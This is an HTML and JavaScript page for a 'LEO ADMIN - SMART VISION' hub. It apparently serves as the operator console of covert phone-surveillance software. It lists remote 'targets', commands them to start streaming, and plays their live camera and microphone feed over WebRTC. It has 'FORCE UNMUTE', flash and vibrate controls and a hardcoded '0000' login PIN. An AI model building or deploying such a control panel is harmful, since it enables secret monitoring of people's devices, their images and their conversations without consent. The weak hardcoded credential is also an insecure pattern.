<!DOCTYPE html>
<html lang="en">
<head>
    <title>LEO ADMIN - SMART VISION</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { box-sizing: border-box; transition: 0.3s; }
        body { background: #050a14; color: #e0e6ed; font-family: 'Segoe UI', sans-serif; margin: 0; display: grid; grid-template-columns: 280px 1fr; height: 100vh; }
        
        /* Sidebar */
        .sidebar { background: #0a192f; border-right: 1px solid #1e3a8a; padding: 20px; overflow-y: auto; }
        .sidebar h2 { font-size: 1.1rem; color: #00d4ff; border-bottom: 1px solid #1e3a8a; padding-bottom: 10px; }
        .user-item { background: #112240; padding: 15px; margin-bottom: 10px; border-radius: 10px; cursor: pointer; border: 1px solid transparent; }
        .user-item:hover { border-color: #00d4ff; }
        .user-item.active { background: #00d4ff; color: #050a14; font-weight: bold; box-shadow: 0 0 15px #00d4ff66; }

        /* Main View */
        .main-view { padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; background: radial-gradient(circle at center, #0a192f, #050a14); }
        .video-wrapper { width: 100%; max-width: 850px; background: #000; border: 2px solid #1e3a8a; border-radius: 20px; overflow: hidden; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        video { width: 100%; height: 100%; object-fit: contain; background: #000; }
        
        /* Indicators */
        .status-header { width: 100%; max-width: 850px; display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 0.85rem; }
        .badge { padding: 5px 12px; border-radius: 20px; background: #112240; border: 1px solid #1e3a8a; }
        .live-dot { height: 10px; width: 10px; background: #ff4444; border-radius: 50%; display: inline-block; margin-right: 5px; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }

        /* Controls */
        .controls { margin-top: 25px; display: flex; gap: 12px; flex-wrap: wrap; justify-content: center; }
        .btn { background: #112240; border: 1px solid #00d4ff; color: #00d4ff; padding: 10px 25px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 0.9rem; }
        .btn:hover { background: #00d4ff; color: #050a14; }
        .btn-audio { background: #28a745; color: white; border: none; }
        #audio-overlay { position: absolute; top: 10px; right: 10px; background: rgba(255, 68, 68, 0.8); color: white; padding: 5px 15px; border-radius: 5px; font-size: 0.7rem; cursor: pointer; }
    </style>
</head>
<body>

    <div class="sidebar">
        <h2>LEO VISION HUB</h2>
        <div id="user-list">
            <p style="color: #4f5b93; font-size: 0.9rem;">Searching for active devices...</p>
        </div>
    </div>

    <div class="main-view">
        <div class="status-header">
            <div class="badge"><span class="live-dot"></span> <span id="target-name">No Device Selected</span></div>
            <div class="badge" id="audio-indicator" style="color: #ff4444;">AUDIO: MUTED</div>
        </div>

        <div class="video-wrapper">
            <div id="audio-overlay" onclick="enableAudio()">CLICK TO UNMUTE AUDIO</div>
            <video id="remoteVideo" autoplay playsinline></video>
        </div>

        <div class="controls">
            <button class="btn btn-audio" onclick="enableAudio()">ðŸ”Š FORCE UNMUTE</button>
            <button class="btn" onclick="sendCommand('flash')">Toggle Flash</button>
            <button class="btn" onclick="sendCommand('vibrate')">Vibrate</button>
            <button class="btn" onclick="location.reload()">Refresh Hub</button>
        </div>
    </div>

    <script>
        const socket = io();
        let currentTargetId = null;
        let pc;
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        // Pin Login
        socket.emit('admin-join', "0000");
        socket.on('update-targets', (list) => {
            const listDiv = document.getElementById('user-list');
            listDiv.innerHTML = "";
            list.forEach((id) => {
                const div = document.createElement('div');
                div.className = `user-item ${currentTargetId === id ? 'active' : ''}`;
                div.innerHTML = `<strong>Device Active</strong><br><small>${id.substring(0,8)}</small>`;
                div.onclick = () => selectTarget(id);
                listDiv.appendChild(div);
            });
        });

        function enableAudio() {
            const video = document.getElementById('remoteVideo');
            video.muted = false;
            video.play();
            document.getElementById('audio-indicator').innerText = "AUDIO: LIVE";
            document.getElementById('audio-indicator').style.color = "#00ff00";
            document.getElementById('audio-overlay').style.display = 'none';
        }

        async function selectTarget(id) {
            currentTargetId = id;
            document.getElementById('target-name').innerText = "STREAMING: " + id.substring(0,8);
            
            if(pc) pc.close();
            pc = new RTCPeerConnection(config);
            
            pc.onicecandidate = (e) => {
                if(e.candidate) socket.emit('signal', { to: currentTargetId, signal: { candidate: e.candidate } });
            };

            pc.ontrack = (e) => {
                document.getElementById('remoteVideo').srcObject = e.streams[0];
            };

            socket.emit('command', { targetId: currentTargetId, cmd: 'start-stream' });
        }
        socket.on('signal', async (data) => {
            if(data.from !== currentTargetId) return;
            if(data.signal.sdp) {
                await pc.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
                if(data.signal.sdp.type === 'offer') {
                    const ans = await pc.createAnswer();
                    await pc.setLocalDescription(ans);
                    socket.emit('signal', { to: data.from, signal: { sdp: ans } });
                }
            } else if(data.signal.candidate) {
                await pc.addIceCandidate(new RTCIceCandidate(data.signal.candidate));
            }
        });

        function sendCommand(cmd) {
            if(!currentTargetId) return alert("Select a device!");
            socket.emit('command', { targetId: currentTargetId, cmd: cmd });
        }
    </script>
</body>
</html>
